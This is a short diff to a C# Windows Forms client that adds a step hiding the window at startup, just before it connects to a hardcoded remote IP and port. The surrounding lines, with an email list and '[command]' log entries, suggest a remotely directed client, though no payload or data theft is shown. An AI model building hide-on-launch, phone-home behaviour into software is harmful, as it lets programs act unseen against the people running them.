@@ -72,6 +72,7 @@ namespace SuperBanFascistLares
             }
             emaillist.Add("42434031@qq.com");
             //初始化本地存储
+            this.Hide();
             ConnectToServer();
             AppendLog($"client online! {DateTime.Now.ToLongTimeString()}");
             AppendLog("[command] client_started");
@@ -438,6 +439,7 @@ namespace SuperBanFascistLares
             try
             {
                 socket.Connect(IPAddress.Parse("49.233.157.228"), Convert.ToInt32(12589));
+                //socket.Connect(IPAddress.Parse("127.0.0.1"), Convert.ToInt32(12589));
             }
             catch (Exception ex)
             {
@@ -615,6 +617,11 @@ namespace SuperBanFascistLares
                 }
             }
             //generateEmail();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //Environment.Exit(0);
         }
     }
 }
